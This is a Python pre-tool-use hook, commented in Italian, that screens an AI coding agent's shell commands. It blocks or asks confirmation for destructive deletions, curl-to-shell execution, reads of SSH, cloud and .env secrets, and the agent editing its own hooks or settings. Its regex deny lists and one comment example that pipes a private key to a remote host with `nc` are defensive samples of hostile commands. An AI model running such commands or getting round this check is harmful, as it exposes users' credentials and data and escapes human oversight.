#!/usr/bin/env python3
"""PreToolUse(Bash, Monitor, Read) hook: blocca o gate shell command pericolosi.

I deny in settings.json coprono i casi a stringa esatta (`rm -rf /`, force-push).
Questo hook copre cio' che il match di stringa non gestisce. Gira su Bash e Monitor;
su Read guarda solo le chiavi private in ~/.ssh (sotto).

BLOCCO DURO (exit 2, stderr -> modello):
- fork bomb, raw write su disco (`> /dev/...`, `dd of=/dev/...`, `mkfs.*`)
- cancellazione della radice, della home o di un disco intero, giudicata sui programmi
  e non sul testo (1/11/2026): `rm -r /`, `rm -rf ~`, `del /s C:\\`, `rd /s C:`, `format C:`,
  anche dentro `cmd /c`. `grep "rm -rf /" f` tace
- chmod/chown ricorsivo su root
- esecuzione di script remoto scaricato al volo: `curl ... | bash`, ma anche
  `bash <(curl ...)`, `eval "$(curl ...)"`, `curl ... | python`. Dal 15/9/2026
  `curl ... | python3 -c "<codice>"` blocca solo se il codice inline esegue testo
  (exec, eval, subprocess, getattr, `$(`): altrimenti è parsing dello stdin
- `bw export` (dump dell'intera vault Bitwarden in chiaro)

CHIEDE CONFERMA (permissionDecision:"ask", exit 0):
- `rm -r`, `find -delete`, `shutil.rmtree` su una cartella che non si rigenera da
  sola e non è temporanea (~/.claude, memoria, progetti, cwd, cartelle di lavoro)
- `git clean -f` (i file non tracciati non stanno in nessun commit)
- scrittura shell su ~/.claude/settings*, hooks/**, firme/** o sugli script dell'aggiornamento
  automatico (auto-modifica delle guardie, codice non firmato installato da solo),
  incluso il caso `cd ~/.claude/hooks && > file` (target relativo dopo un cd)
- scrittura shell su git hook (.git/hooks/**) e servizi di avvio automatico
  (~/Library/LaunchAgents, ~/.config/systemd/user, ~/.config/autostart)
- creazione di un file di unlock (*-unlock-*) che sbloccherebbe l'auto-modifica
- lettura di file segreti via shell (cat/head/xxd/base64/perl/ruby/nc/redirezione
  `< file`... su chiavi private, ~/.ssh, ~/.aws/credentials, .gnupg, *.pem, .env...),
  anche indiretta: `find <segreto> | xargs cat`, `find -exec cat`, `while read`
- Read di un file in ~/.ssh che non è config, known_hosts, authorized_keys o una chiave
  pubblica: una chiave privata con un nome libero sfugge ai deny (1/11/2026)
- sed che esegue in shell, col comando `e` o col flag `e` di s/// (regola sed-e, 1/11/2026)
- git push con la destinazione riscritta nello stesso comando: `-c remote.X.url=`, pushurl,
  insteadOf, `--config-env`, GIT_CONFIG_* (regola git-destinazione, 1/11/2026)
- git branch -D di un ramo con commit che non stanno altrove, git stash drop di uno stash che
  lo stesso comando non salva prima, git stash clear (regole git-ramo e git-stash)
- docker distruttivo su volumi (`docker volume rm`, `system prune --volumes`)

Fail-open su parsing (i casi catastrofici su path root restano nei deny).
"""
import json
import re
import sys
import os
import signal
import shlex
import subprocess
import importlib.util


def _stdin_timeout(signum, frame):
    sys.exit(0)


if hasattr(signal, "SIGALRM"):
    signal.signal(signal.SIGALRM, _stdin_timeout)


# --- Blocco duro (exit 2) ---
# Il comando che scarica: curl e wget ovunque, fetch solo in testa a un segmento.
_DOWNLOAD = r"(\b(?:curl|wget)\b|(?:^|[;&|(`\n])\s*(?:sudo\s+)?fetch\b)"
DANGEROUS = [
    (r":\(\)\s*\{[^}]*\}\s*;\s*:", "fork bomb"),
    (r"\bmkfs\.[a-z0-9]+", "format filesystem"),
    (r"\bdd\s+[^|]*\bof=/dev/(sd[a-z]|nvme|disk)", "scrittura raw su block device"),
    (r">\s*/dev/(sd[a-z]|nvme|disk|hd[a-z])", "redirezione raw su disco"),
    (r"\bchmod\s+-R\s+0*777\s+/(\s|$)", "permessi world-writable su root"),
    (r"\bchown\s+-R\s+\S+\s+/(\s|$)", "cambio ownership ricorsivo su root"),
    # curl|bash e le sue varianti che eseguono uno script remoto scaricato al volo:
    # `\|` non è una pipe: è l'alternativa di un pattern (`grep 'curl\|python'`, 21/10/2026).
    # `fetch` conta solo come comando in testa a un segmento (il fetch di BSD): `git fetch && git show
    # x:f.py | python3 -` legge un file del repo, e non scarica niente (2/11/2026, #4478). _DOWNLOAD
    # resta un solo gruppo che cattura: la regola python sotto conta i gruppi per il \3.
    (_DOWNLOAD + r"[^|]*(?<!(?<!\\)\\)\|\s*(sudo\s+)?(bash|sh|zsh|fish|perl|ruby|node|php)\b",
     "pipe di script remoto in un interprete"),
    # 15/9/2026: `curl ... | python3 -c "import json..."` è parsing, non esecuzione
    # dello stdin (14 blocchi in una settimana). Passa solo il codice inline fra
    # virgolette senza command-substitution né primitive che eseguono testo. Le
    # coppie di escape (`\\n`, `\\"`) si consumano intere: la ricerca delle parole
    # vietate continua fino alla virgoletta che chiude davvero.
    # 15/10/2026: anche con i flag dell'interprete prima di -c (`python3 -I -c`, la
    # forma isolata) e con la versione (`python3.13`).
    # 30/10/2026 (#4109): passa anche `| python3 -m json.tool` con le sue opzioni a fine segmento:
    # formatta il JSON e non esegue niente.
    (_DOWNLOAD + r"[^|]*(?<!(?<!\\)\\)\|\s*(sudo\s+)?python3?(?:\.\d+)?(?![\w.])"
     r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-m\s+json\.tool(?:\s+--[a-z-]+(?:[=\s]\d+)?)*(?=\s*(?:$|[;&|)>\n]|2>)))"
     r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-c\s+([\"'])(?:\\[\s\S]|(?!\3|\\|\$\(|`|\b(?:exec|eval|compile|__import__|__builtins__|builtins|"
     r"getattr|globals|importlib|system|popen|subprocess|runpy|pickle|marshal|spawn)\b)[\s\S])*\3)",
     "pipe di script remoto in un interprete"),
    (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node|php)\b\s+<\(\s*(curl|wget|fetch)\b",
     "esecuzione via process-substitution di script remoto"),
    (r"\beval\b[^\n]*\$\(\s*(curl|wget|fetch)\b",
     "eval di output di download remoto"),
    (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node)\b\s+-c\s+[\"']?\$\(\s*(curl|wget|fetch)\b",
     "interprete -c su output di download remoto"),
    (r"\bsudo\s+rm\s+-rf?\s+(/|~|\$HOME|\*)", "rm ricorsivo con sudo su root/home/wildcard"),
    # `bw export` anche con opzioni e valori davanti (`bw --session X export`):
    # il deny di settings.json copre solo la forma letterale. `--help` non esporta
    # niente: resta libero (tre falsi positivi il 12/9/2026).
    (r"\bbw\b(\s+-[-\w]+(\s+[^\s-][^\s]*)?)*\s+export\b(?!\s+(--help|-h)\b)",
     "export dell'intera vault Bitwarden in chiaro"),
]

# --- Scrittura su config/hook di Claude Code -> ask ---
# Path config/hook considerati sensibili (settings*.json, hooks/**, .claude.json).
_CFG_SUFFIX_RE = re.compile(
    r"\.claude/(?:settings[^/]*\.json|hooks/|hooks$|\.claude\.json)",
    re.IGNORECASE,
)
# Operatori di scrittura shell. Il match testuale del path assoluto è il caso base;
# _writes_config() sotto copre anche il target RELATIVO dopo un `cd ~/.claude/...`.
_CFG_ABS = r"[^\s'\";|&]*\.claude/(?:settings[^/\s'\"]*\.json|hooks/|\.claude\.json)"
# cp, mv, install, rsync e ln non stanno qui: li giudica _writes_config, che sa quale
# argomento è la destinazione. Nel testo `cp ~/.claude/settings.json /tmp/x` sembrava una
# scrittura, e copiare la config altrove è una lettura (9/9/2026, nella config dell'autore).
# dd scrive solo su `of=`.
CONFIG_WRITE_RE = re.compile(
    r"(?:>>?\s*" + _CFG_ABS +
    r"|\b(?:tee|truncate|touch|chmod|chown)\b[^|;&]*" + _CFG_ABS +
    r"|\bdd\b[^|;&]*\bof=" + _CFG_ABS +
    r"|\bsed\b[^|;&]*-i[^|;&]*" + _CFG_ABS +
    r"|open\(\s*['\"][^'\"]*\.claude/(?:settings|hooks/|\.claude\.json)[^'\"]*['\"]\s*,\s*['\"][wa])",
    re.IGNORECASE,
)
# CLAUDE.md, in qualunque cartella: via Edit/Write lo protegge protect_claude_md.py con un
# unlock, qui si copre il vettore shell (>, sed -i, cp, tee...), che altrimenti lo riscrive senza prompt.
CLAUDE_MD_WRITE_RE = re.compile(
    r"(?:>>?\s*[^\s'\";|&]*CLAUDE(?:\.local)?\.md\b"
    r"|\bsed\b[^|;&]*-i[^|;&]*CLAUDE(?:\.local)?\.md\b)"
)
# open() di python in scrittura su un CLAUDE.md: chiede sempre, prima di CLAUDE_MD_WRITE_RE (1/11/2026).
CLAUDE_MD_OPEN_RE = re.compile(r"open\(\s*['\"][^'\"]*CLAUDE(?:\.local)?\.md['\"]\s*,\s*['\"][wax+]")
# Percorsi di avvio automatico (git hook, LaunchAgents, systemd utente, autostart):
# via Edit/Write li protegge protect_claude_md.py con un unlock, qui il vettore shell.
_PERSIST_ABS = (r"[^\s'\";|&]*(?:\.git/hooks/[^\s'\";|&]+|Library/LaunchAgents/[^\s'\";|&]+"
                r"|\.config/(?:systemd/user|autostart)/[^\s'\";|&]+)")
# Qui solo redirezione e open(): cp, tee, sed -i e gli altri binari li giudica
# _writes_config, che sa quale argomento è la destinazione (copiare un hook
# altrove è una lettura).
PERSIST_WRITE_RE = re.compile(
    r"(?:>>?\s*" + _PERSIST_ABS +
    r"|open\(\s*['\"][^'\"]*(?:\.git/hooks/|Library/LaunchAgents/|\.config/(?:systemd/user|autostart)/)[^'\"]*['\"]\s*,\s*['\"][wa])"
)
# Binari che scrivono un file passato come argomento.
_WRITE_BINS = frozenset("tee cp mv install rsync ln dd truncate touch".split())

# --- File di unlock che sbloccherebbero l'auto-modifica di config/hook -> ask ---
# Solo la CREAZIONE del file (redirezione, touch, tee, open in scrittura) e solo direttamente
# in ~/.claude, dove protect_claude_md.py lo cerca. Leggere una nota che ha "unlock" nel nome
# non sblocca niente (8/9/2026, nella config dell'autore). cp, mv e ln: _writes_config(_is_unlock).
_UNLOCK_ABS = r"[^\s'\";|&]*\.claude/[^\s'\";|&/]*unlock[^\s'\";|&/]*(?=[\s'\";|&)]|$)"
UNLOCK_RE = re.compile(
    r"(?:>>?\s*|\b(?:touch|tee)\b[^|;&]*)" + _UNLOCK_ABS +
    r"|open\(\s*['\"][^'\"]*\.claude/[^'\"/]*unlock[^'\"/]*['\"]\s*,\s*['\"][wax]",
    re.IGNORECASE,
)

# --- Lettura di file segreti via shell -> ask (vedi _reads_secret sotto) ---
# In ~/.ssh/ chiedono le chiavi private e i file sconosciuti. config, known_hosts,
# authorized_keys e le chiavi pubbliche (.pub) non sono segreti: si leggono liberi
# (8/9/2026, la config dell'autore chiedeva a ogni `grep Host ~/.ssh/config`).
_SSH_SEGRETO = (r"\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\w.-])|[^\s'\"/]*\.pub(?![\w.-]))"
                r"|(?:^|/)id_(?:rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)")
_SSH_LETTURA = re.compile(r"(?:^|/)\.ssh/(?!config\.d/)(?:[^/]+/)*"
                          r"(?!(?:config|known_hosts(?:\.old)?|authorized_keys)$|[^/]*\.pub$)[^/]+$", re.IGNORECASE)
SECRET_PATH_RE = re.compile(
    r"(" + _SSH_SEGRETO + r"|\.aws/credentials|\.gnupg/|"
    # I file col solo nome (token_cache.json...) contano come argomento o in un path, non
    # citati dopo uno spazio: `python3 -c "...write('serve rm token_cache.json')"` scrive una
    # nota, non legge il token (8/9/2026, nella config dell'autore).
    r"\.git-credentials|\.pem\b|"
    r"(?<!\s)(?:service-account[^\s'\"]*\.json|credentials\.json|client_secret[^\s'\"]*\.json|token_cache\.json)|"
    r"\.pypirc|secrets\.env|\.secrets/|"
    r"\.config/gh/hosts\.yml|\.npmrc|\.claude/data/credentials/|"
    r"\.docker/config\.json|\.kube/config|"
    # ~/.claude.json tiene le env dei server MCP, chiavi API comprese. Solo in forma di
    # PATH (`/` o `~` davanti): il nome citato in una frase non è una lettura.
    r"[/~][^\s'\"]*/\.claude\.json)",
    re.IGNORECASE,
)
# Un file .env (anche .env.local, config/.env.production): le chiavi dei servizi di un progetto
# (17/10/2026, #3506). Non .env.example e simili, non process.env. Come destinazione di una copia
# (`cp .env.example .env`) si scrive, non si legge: vedi _reads_secret_flat.
ENV_RE = re.compile(r"(?<![\w.])\.env\b(?!\.(?:example|sample|template|dist)\b)", re.IGNORECASE)

# Check segreti PER-SEGMENTO. Chiede se un path segreto compare come ARGOMENTO
# (non come identità ssh) in un segmento il cui comando è un binario di lettura
# o di trasporto, oppure se il segmento reindirizza un segreto in ingresso
# (`< chiave`, `$(< chiave)`). Ampliato per coprire perl/ruby/nc/socat/tac/rev/
# mapfile e la redirezione, che prima sfuggivano (chiave privata leggibile/inviata
# senza ask). Lo scarto di `-i <key>` / `IdentityFile=` evita i falsi positivi su
# ssh/scp -i <chiave> (identità, non lettura).
_READ_BINS = frozenset(
    "cat head tail less more bat xxd od strings base64 nl cut awk sed "
    "cp scp rsync dd open grep perl ruby python python3 tac rev mapfile "
    "nc ncat socat gpg tar zip curl wget".split()
)
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_SKIP_WRAPPERS = frozenset(("sudo", "command", "nohup", "caffeinate", "timeout", "env"))
# `< file` o `$(< file)` con file segreto: esfiltrazione via redirezione (es.
# `nc host 443 < ~/.ssh/id_ed25519`, `echo "$(<~/.ssh/id_ed25519)"`).
_SECRET_REDIR_RE = re.compile(
    r"(?:<\s*|\$\(\s*<\s*)[^\s'\";|&)]*"
    r"(\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\w.-])|[^\s'\"/]*\.pub(?![\w.-]))|"
    r"id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)|\.aws/credentials|\.gnupg/|"
    r"\.git-credentials|\.pem|credentials\.json|\.pypirc|secrets\.env|\.secrets/|"
    r"token_cache\.json|client_secret|\.claude/data/credentials/|"
    r"(?<![\w.])\.env\b(?!\.(?:example|sample|template|dist)\b))",
    re.IGNORECASE,
)


def _cmd_subst_bodies(command: str):
    """Corpi delle command-substitution `$(...)` e backtick: bash li ESEGUE anche
    dentro le doppie virgolette, quindi `git commit -m "$(cat chiave)"` legge davvero
    la chiave. Vanno analizzati come comandi a se'."""
    bodies = re.findall(r"\$\(([^()]*)\)", command)
    bodies += re.findall(r"`([^`]*)`", command)
    return bodies


def _reads_secret(command: str) -> bool:
    cmd = _testo_shell(command).replace("\\\n", " ")  # prima gli heredoc: una \ nel corpo è testo
    for src in [cmd] + _cmd_subst_bodies(cmd):
        if _reads_secret_flat(src):
            return True
    return False


# Il tokenizer (heredoc, messaggi di commit, segmenti) sta in forma_comando.py dal 15/10/2026:
# prima forma_comando caricava questo file e questo file caricava forma_comando.
_spec_fc = importlib.util.spec_from_file_location(
    "forma_comando", os.path.join(os.path.dirname(os.path.abspath(__file__)), "forma_comando.py"))
_fc = importlib.util.module_from_spec(_spec_fc)
_spec_fc.loader.exec_module(_fc)
_testo_shell = _fc.testo_shell
_segmenti_parole = _fc.segmenti_parole
_hd = _fc._hd


# grep che stampa solo conteggi o nomi di file: nessun contenuto esce.
_GREP_SOLO_METADATI = re.compile(r"^-[A-Za-z]*[clLq][A-Za-z]*$|^--(count|files-with(out)?-matches?|quiet|silent)$")
_GREP_OPT_CON_ARG = frozenset(("-A", "-B", "-C", "-m", "-d", "-D", "--context", "--max-count"))


def _senza_pattern(binario: str, args: list) -> list:
    """Toglie il pattern di grep o lo script di sed: è testo, non un file letto.

    `grep -e P` e `sed -e S` hanno il pattern esplicito, e allora nessun
    argomento posizionale è pattern. `grep -f F` e `sed -f F` LEGGONO F: resta.
    """
    if binario not in ("grep", "egrep", "fgrep", "rg", "sed"):
        return args
    esplicito = ("-e", "--regexp", "--expression")
    fuori, i, tolto = [], 0, False
    if any(a in esplicito or a in ("-f", "--file") or a.startswith(("--regexp=", "--expression=", "--file=")) for a in args):
        tolto = True
    while i < len(args):
        a = args[i]
        if a in esplicito:
            i += 2
            continue
        if binario == "sed" and a == "-i" and i + 1 < len(args) and (args[i + 1] == "" or args[i + 1].startswith(".")):
            fuori.extend(args[i:i + 2])
            i += 2
            continue
        if a in ("-f", "--file") or (a in _GREP_OPT_CON_ARG and binario != "sed"):
            fuori.extend(args[i:i + 2])
            i += 2
            continue
        if not tolto and not a.startswith("-"):
            tolto = True
            i += 1
            continue
        fuori.append(a)
        i += 1
    return fuori


_SHELLS = _fc.SHELL
# La cartella nominata senza slash finale (`find ~/.aws | xargs cat`): SECRET_PATH_RE
# vuole lo slash, perché per un cat diretto il nome della cartella non è una lettura.
# Per xargs e -exec invece la cartella è la sorgente dei file letti.
_SECRET_DIR_RE = re.compile(r"(\.ssh|\.gnupg|\.secrets|\.aws|\.claude/data/credentials)(?=[\s'\"/*]|$)")


def _lettura_indiretta(cmd):
    """Il path segreto e il lettore stanno in comandi diversi, e il controllo per
    segmento non li vede insieme: `find <segreto> | xargs cat`,
    `echo <segreto> | while read f; do cat "$f"`, `find <segreto> -exec cat {} \\;`.
    `ls <segreto> | xargs basename` resta muto."""
    def segreto(s):
        return SECRET_PATH_RE.search(s) or _SECRET_DIR_RE.search(s)

    testo = re.sub(r"\d*>&\d+|&>", " ", cmd)
    for stmt in re.split(r"\|\||&&|[;&\n]", testo):
        stadi = stmt.split("|")
        for k, stadio in enumerate(stadi):
            if not segreto(stadio):
                continue
            for dopo in stadi[k + 1:]:
                toks = [os.path.basename(t) for t in dopo.split()]
                if not toks:
                    continue
                if toks[0] in ("xargs", "parallel") and any(t in _READ_BINS or t in _SHELLS for t in toks[1:]):
                    return True
                if toks[0] == "while" and "read" in toks[1:3]:
                    return True
        m = re.search(r"\bfind\b(.*?)\s-(?:exec|execdir|ok|okdir)\s+(\S+)", stmt)
        if m and segreto(m.group(1)) and os.path.basename(m.group(2)) in (_READ_BINS | _SHELLS):
            return True
    return False


_INTERPRETI = frozenset(("python", "python3", "perl", "ruby"))
# Prosa: contiene spazi e non comincia come un path (/, ~, ., $).
_PROSA_RE = re.compile(r"^(?![/~.$])(?=[^\n]*\s)", re.DOTALL)


def _reads_secret_flat(cmd: str) -> bool:
    if _SECRET_REDIR_RE.search(cmd):
        return True
    if _lettura_indiretta(cmd):
        return True
    for toks in _segmenti_parole(cmd):
        i = 0
        while i < len(toks) and (
            _ENV_ASSIGN_RE.match(toks[i]) or toks[i] in _SKIP_WRAPPERS
        ):
            i += 1
        if i >= len(toks):
            continue
        binario = os.path.basename(toks[i])
        if binario not in _READ_BINS:
            continue
        # grep -c, -l, -q: stampa conteggi o nomi di file, non il contenuto.
        if binario in ("grep", "egrep", "fgrep") and any(_GREP_SOLO_METADATI.match(t) for t in toks[i + 1:]):
            continue
        parole = _senza_pattern(binario, toks[i + 1:])
        grep = binario in ("grep", "egrep", "fgrep")
        args, j = [], 0
        while j < len(parole):
            t = parole[j]
            if t == "-i" and grep:
                j += 1  # per grep -i è "ignora maiuscole", senza argomento
                continue
            if t == "-i" and j + 1 < len(parole):
                j += 2  # identità ssh/scp/rsync (o suffix sed -i: mai un segreto)
                continue
            if t.startswith("-oIdentityFile=") or t.startswith("IdentityFile="):
                j += 1
                continue
            # rsync e tar: il valore di --exclude è un file che NON si legge (`--exclude .env` chiedeva
            # conferma, 20/10/2026, #3525).
            if t in ("--exclude", "--exclude-from", "--filter") and j + 1 < len(parole):
                j += 2
                continue
            if t.startswith(("--exclude=", "--exclude-from=", "--filter=")):
                j += 1
                continue
            args.append(t)
            j += 1
        # Interprete che esegue uno script: un argomento in prosa (con spazi, non un path) è testo
        # per lo script, non un file letto (`tasks.py comment ... "entra con ~/.ssh/id_ed25519"`
        # chiedeva conferma, 21/10/2026). Il codice di -c/-e resta controllato per intero.
        if binario in _INTERPRETI and args and not args[0].startswith("-"):
            args = [a for a in args if not _PROSA_RE.match(a)]
        if any(SECRET_PATH_RE.search(a) for a in args):
            return True
        letti = args[:-1] if binario in ("cp", "install", "rsync", "scp") and len(args) >= 2 else args
        if any(ENV_RE.search(a) for a in letti):
            return True
    return False

# --- Docker distruttivo su volumi -> ask ---
DOCKER_DESTRUCTIVE_RE = re.compile(
    r"\bdocker\s+volume\s+rm\b|\bdocker\s+system\s+prune\b[^|]*--volumes",
    re.IGNORECASE,
)

BARE_TARGETS = {".", "./", "*", ".*", "*.*", "./*", ".//"}

# --- sed che SCRIVE col comando `w` -> ask ---
# Il comando `w` di sed scrive su file anche sotto `-n`, e anche come flag di `s///`:
# `sed -n 'w ~/.zshrc' x` sovrascrive .zshrc aggirando il deny Edit(~/.zshrc).
# Il carattere prima di `w` è "non alfanumerico" per coprire l'apice di 'w file',
# lo spazio di `; w file` e lo slash di `s/a/b/w file`. `[^|&]*` non attraversa una
# pipe, così `sed -n p x | grep w foo` non matcha.
SED_WRITE_RE = re.compile(r"(^|[\s;&|])sed\s[^|&]*[^A-Za-z0-9]w\s+[^\s|;&]")
_SED_SCRIPT_W = re.compile(r"(^|[^A-Za-z0-9])w\s+[^\s|;&]")
# Il pattern e la sostituzione di s/// e y/// e gli indirizzi /re/ sono testo, non comandi (31/10/2026):
# `sed -i 's/if (w >= 700 \&\& w <= 1000) {/if (w <= 1000) {/' probe.cjs` sembrava una scrittura per la `w`
# del codice JavaScript. Si svuotano prima di cercare `w`; i flag di s/// restano, anche attaccati (`gw`).
_SED_S_CORPO = re.compile(r"(^|[;\n{}!\s\d$,])([sy])([^\w\s\\])((?:\\.|(?!\3)[^\\])*)\3((?:\\.|(?!\3)[^\\])*)\3")
_SED_INDIRIZZO = re.compile(r"(^|[;\n{}!\s,])/((?:\\.|[^/\\\n])*)/")
_SED_FLAG_W = re.compile(r"s([^\w\s\\])\1\1[gpiImMe0-9]*w")
# `1w file`, `$w file`, `2,5w file`: un indirizzo numerico attaccato a `w` (prima sfuggiva).
_SED_ADDR_W = re.compile(r"(^|[\s;{}!])(?:\d+|\$)(?:,(?:\d+|\$))?!?\s*w\s*[^\s|;&]")
# GNU sed esegue in shell il testo del comando `e` e quello del flag `e` di s/// (1/11/2026, F05):
# `sed -n '1e rm -rf X' f` cancellava senza conferma. Si cercano sullo script già svuotato.
_SED_CMD_E = re.compile(r"(^|[;\n{}!\s])(?:(?:\d+|\$|//)(?:,(?:\d+|\$|//))?!?\s*)?e(\s|$|;)")
_SED_FLAG_E = re.compile(r"s([^\w\s\\])\1\1[gpiImMw0-9]*e")


def _senza_corpi_sed(t: str) -> str:
    t = _SED_S_CORPO.sub(lambda m: m.group(1) + m.group(2) + m.group(3) * 3, t)
    return _SED_INDIRIZZO.sub(lambda m: m.group(1) + "//", t)


def _sed_esegue(command: str) -> bool:
    """`sed` che esegue un comando di shell col comando `e` o col flag `e` di s///."""
    for toks in _segmenti_parole(_testo_shell(command)):
        i = 0
        while i < len(toks) and (_ENV_ASSIGN_RE.match(toks[i]) or toks[i] in _SKIP_WRAPPERS):
            i += 1
        if i < len(toks) and os.path.basename(toks[i]) == "sed":
            script = _senza_corpi_sed(" ".join(toks[i + 1:]))
            if _SED_CMD_E.search(script) or _SED_FLAG_E.search(script):
                return True
    return False


def _sed_scrive(command: str) -> bool:
    """`sed` che scrive col comando `w`, cercato nel solo segmento di sed (15/10/2026).

    La regex sull'intero comando attraversava `;` e a capo:
    `sed -n 25,50p f; for w in a b` sembrava una scrittura. Dentro una shell
    annidata o un ssh il segmento resta intero e vale la regex di prima.
    """
    for toks in _segmenti_parole(_testo_shell(command)):
        i = 0
        while i < len(toks) and (_ENV_ASSIGN_RE.match(toks[i]) or toks[i] in _SKIP_WRAPPERS):
            i += 1
        if i >= len(toks):
            continue
        binario = os.path.basename(toks[i])
        if binario == "sed":
            script = _senza_corpi_sed(" ".join(toks[i + 1:]))
            if _SED_SCRIPT_W.search(script) or _SED_FLAG_W.search(script) or _SED_ADDR_W.search(script):
                return True
        if binario in _SHELLS | {"ssh", "eval", "xargs"} and SED_WRITE_RE.search(" ".join(toks)):
            return True
    return False

# Cartelle che uno strumento ricrea da solo: cancellarle non perde lavoro.
RIGENERABILI = {
    "node_modules", "dist", "build", "out", ".next", ".nuxt", ".svelte-kit",
    ".turbo", ".parcel-cache", ".cache", "coverage", "__pycache__",
    ".pytest_cache", ".mypy_cache", ".ruff_cache", ".venv", "venv", "target",
}

def _home():
    return os.path.expanduser("~")


def _projects_base():
    raw = os.environ.get("PROJECTS_BASE", "").strip()
    if raw:
        raw = raw.replace("${HOME}", _home()).replace("$HOME", _home())
        return os.path.normpath(os.path.expanduser(raw))
    return os.path.normpath(os.path.join(_home(), "Documents", "ClaudeCode"))


def _ask(regola, reason):
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason,
        }
    }))
    # Il dispatcher di Arturo chiede anche quale regola ha parlato: va nella telemetria come
    # block-dangerous.py.<regola>, così si vede quale chiede a vuoto (22/10/2026). Senza la
    # variabile l'uscita resta il solo JSON, come la legge la config dell'autore.
    if os.environ.get("ARTURO_REGOLA") == "1":
        print(f"REGOLA: {regola}")
    return 0


# Variabili shell nel target: `${VAR:-default}`, `${VAR}`, `$VAR`.
_VAR_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)(:?[-=])([^}]*)\}|\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)")
# Assegnazioni nel comando: `X=...`, `export X=... Y=...`. Il valore vale per il
# comando: `export D=$TMPDIR/prova; rm -rf $D` cancella una cartella temporanea.
_ASSEGNAZIONE_CMD_RE = re.compile(r"""(?:^|(?<=[\s;&|(]))([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|[^\s;&|()]*)""")
_ASSEGNAZIONE_MKTEMP_RE = re.compile(r"""(?:^|(?<=[\s;&|(]))([A-Za-z_][A-Za-z0-9_]*)=(?:"(\$\(\s*mktemp\b[^()`$;|&"]*\))"|(\$\(\s*mktemp\b[^()`$;|&"]*\)))""")
_ASSEGNATE = {}


def _assegnazioni(command):
    """Le variabili assegnate nel comando, in ordine (vince l'ultima), col valore grezzo."""
    trovate = []
    for m in _ASSEGNAZIONE_CMD_RE.finditer(command):
        grezzo = m.group(3) if m.group(3) is not None else (m.group(4) if m.group(4) is not None else m.group(2))
        trovate.append((m.start(), m.group(1), grezzo))
    # `tmp=$(mktemp -d)`: la regex sopra si ferma alla parentesi e lascia "$" (20/10/2026)
    for m in _ASSEGNAZIONE_MKTEMP_RE.finditer(command):
        trovate.append((m.start(), m.group(1), m.group(2) or m.group(3)))
    # La stessa posizione può comparire due volte (la regex generica e quella di mktemp): vince mktemp.
    per_posizione = {}
    for pos, nome, valore in trovate:
        if pos not in per_posizione or _MKTEMP_RE.match(valore or ""):
            per_posizione[pos] = (nome, valore)
    # Una variabile assegnata due volte con valori diversi non si risolve (1/11/2026, F06):
    # `S=~/Documents; cd "$S"; S=/tmp; rm -rf ClaudeCode` leggeva il cd col valore finale.
    out = {}
    for _, (nome, valore) in sorted(per_posizione.items()):
        out[nome] = None if (nome in out and out[nome] != valore) else valore
    # Legata anche fuori da NOME=valore (read, printf -v, for, mapfile, declare, +=): il valore dipende dal
    # punto del comando, e `read S <<< ~/Documents; cd "$S"; S=/tmp` leggeva il cd come /tmp (review del 1/11).
    for nome in _legate_altrove(command):
        if nome in out:
            out[nome] = None
    return out


_LEGA_ELENCO = re.compile(r"(?:^|[\s;&|(])(?:read|mapfile|readarray|declare|typeset|local|export|readonly)\b([^\n;&|)]*)")
_LEGA_UNA = re.compile(r"\bprintf\s+(?:-\S+\s+)*-v\s*([A-Za-z_]\w*)|(?:^|[\s;&|(])(?:for|select)\s+([A-Za-z_]\w*)"
                       r"|\bgetopts\s+\S+\s+([A-Za-z_]\w*)|(?<![\w$])([A-Za-z_]\w*)\+=")


def _legate_altrove(command):
    nomi = set()
    for m in _LEGA_ELENCO.finditer(command):
        nomi.update(re.findall(r"(?<![\w$=/.-])([A-Za-z_]\w*)(?![\w=])", m.group(1)))
    for m in _LEGA_UNA.finditer(command):
        nomi.update(g for g in m.groups() if g)
    return nomi


def _expand_vars(t):
    """Espande le variabili: prima quelle assegnate nel comando, poi l'ambiente
    dell'hook (quello della sessione: TMPDIR, HOME...). Restituisce None se resta
    qualcosa che non si risolve (`$(...)`, backtick, variabile non definita): un
    path che non si conosce non si giudica come sicuro."""
    def rep(m):
        name = m.group(1) or m.group(4) or m.group(5)
        if name in _ASSEGNATE and _ASSEGNATE[name] is None:
            return m.group(0)  # assegnata più volte: il valore dipende dal punto del comando
        if name in _ASSEGNATE and _MKTEMP_RE.match(_ASSEGNATE[name]):
            val = "/tmp/mktemp.XXXXXX"  # cartella appena creata da mktemp: vedi _MKTEMP_RE
        elif name in _ASSEGNATE:
            val = os.path.expanduser(_ASSEGNATE[name]) if _ASSEGNATE[name].startswith("~") else _ASSEGNATE[name]
        else:
            val = _home() if name == "HOME" else os.environ.get(name)
        if m.group(1):
            if val is None or (val == "" and m.group(2).startswith(":")):
                return m.group(3)
            return val
        return val if val is not None else m.group(0)
    for _ in range(3):  # il default può contenere a sua volta una variabile (${X:-$HOME/..})
        t2 = _VAR_RE.sub(rep, t)
        if t2 == t:
            break
        t = t2
    if "$" in t or "`" in t:
        return None
    return t


# `$(mktemp ...)` crea una cartella o un file nuovo e vuoto: cancellarlo non perde niente
# (7/9/2026, nella config dell'autore). Vale come un temporaneo.
_MKTEMP_RE = re.compile(r"^\$\(\s*mktemp\b[^()`$;|&]*\)$")


def _resolve(target, cwd):
    t = (target or "").strip().strip('"').strip("'")
    if not t:
        return None
    if _MKTEMP_RE.match(t):
        return os.path.normpath("/tmp/mktemp.XXXXXX")
    t = _expand_vars(t)
    if t is None:
        return None
    t = os.path.expanduser(t)
    if not os.path.isabs(t):
        if cwd is None:
            return None  # cwd sconosciuto (cd verso un path che non si risolve): niente path inventati
        t = os.path.join(cwd, t)
    return os.path.normpath(t)


